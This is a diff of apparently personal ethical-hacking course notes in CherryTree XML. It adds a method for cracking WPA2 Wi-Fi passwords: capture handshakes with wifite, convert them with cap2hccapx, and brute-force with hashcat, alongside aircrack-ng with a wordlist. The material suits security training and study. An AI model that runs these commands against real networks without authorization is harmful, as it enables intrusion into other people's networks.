@@ -637,7 +637,7 @@ Simple firewall :: </rich_text>
 ======================================================================</rich_text>
   </node>
   <node name="Module 15: SQL Injection" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1621940388" ts_lastsave="1623150748"/>
-  <node name="Module 16: Hacking Wireless Networks" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1623150748" ts_lastsave="1623320045">
+  <node name="Module 16: Hacking Wireless Networks" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1623150748" ts_lastsave="1623326388">
     <rich_text>A wireless network refers to any type of computer network that is wireless and is commonly associated with a telecommunications network whose interconnections between nodes are implemented without the use of wires. Wireless telecommunications networks are generally implemented with some type of remote information transmission system that uses electromagnetic waves such as radio waves for the carrier. The implementation usually takes place at the physical level or layer of the network.
 =====================================================================
 </rich_text>
@@ -721,7 +721,7 @@ Simple firewall :: </rich_text>
     <rich_text> 
 ----------------------------------------------------------------------------------------------------------------------------------------
 </rich_text>
-    <rich_text background="#ffff00000000">3. Method 01 : Hack Wi-Fi WPA2 Automatically Using Besside-ng</rich_text>
+    <rich_text background="#ffff00000000">3. Method 01 : Hack Wi-Fi WPA2 Automatically Using Aircrack-ng</rich_text>
     <rich_text> 
 → Make sure you keep the wifi adaptor in the monitor mode .
 
@@ -767,10 +767,49 @@ Simple firewall :: </rich_text>
 → Open wireshark → </rich_text>
     <rich_text foreground="#0000ffff0000">wireshark hack1.cap </rich_text>
     <rich_text> 
-→ Search for eapol on the wireshark → check for 4 to 4 handshake file.
+→ </rich_text>
+    <rich_text background="#ffff00000000">Search for eapol on the wireshark → check for 4 to 4 handshake file</rich_text>
+    <rich_text>.
 → </rich_text>
     <rich_text foreground="#0000ffff0000">root@kali:-# aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt</rich_text>
-    <rich_text> #To decrypt the .cap to worlist.
+    <rich_text> #To decrypt the .cap to wordlist.
+====================================================================
+
+</rich_text>
+    <rich_text background="#ffff00000000">Method 02 : Hack Wi-Fi WPA2 using Wifite and  Hashcat</rich_text>
+    <rich_text> 
+
+</rich_text>
+    <rich_text background="#ffff00000000">#Things to remember : </rich_text>
+    <rich_text>
+
+→ We need to have high level GPU. 
+→ VMware or Virtualbox could be problem as it has low GPU.
+→ Recomended to use in on Primary OS.
+→ Will be converting .cap file into format of hashcat. 
+→ If you are cracking via windows then hashcat must be installed.
+
+→ </rich_text>
+    <rich_text foreground="#0000ffff0000">$ : sudo wifite --wpa --kill</rich_text>
+    <rich_text>  #This will kill unnesessary process and start wifite.  
+# choose the number you want to attack and stop as soon you get handshake and directory is created of .cap.
+→ $ : </rich_text>
+    <rich_text foreground="#0000ffff0000">sudo /usr/share/hashcat-utils/cap2hccapx.bin *name of your handshake file.cap* sumedh.hccapx</rich_text>
+    <rich_text>  
+# 4 to 4 handshake is written in hashcat format. If windows copy the .cap and paste to hashcat directory. 
+Navigate to hashcat folder, 
+
+</rich_text>
+    <rich_text foreground="#0000ffff0000">→ C:\Users\Sumedh\Downloads\hashcat-6.1.1&gt;hashcat.exe -I</rich_text>
+    <rich_text> #To see GUI info 
+</rich_text>
+    <rich_text foreground="#0000ffff0000">→ C:\Users\Sumedh\Downloads\hashcat-6.1.1&gt;hashcat.exe</rich_text>
+    <rich_text> -m 2500 -a 3  sumedh.hccapx ?d?d?d?d?d?d?d?d
+#Press S to see status info.
+</rich_text>
+    <rich_text foreground="#0000ffff0000">→ C:\Users\Sumedh\Downloads\hashcat-6.1.1&gt;hashcat.exe</rich_text>
+    <rich_text> -m 2500 -a 3  sumedh.hccapx ?d?d?d?d?d?d?d?d 
+--show #To see the password extracted.
 
 
 
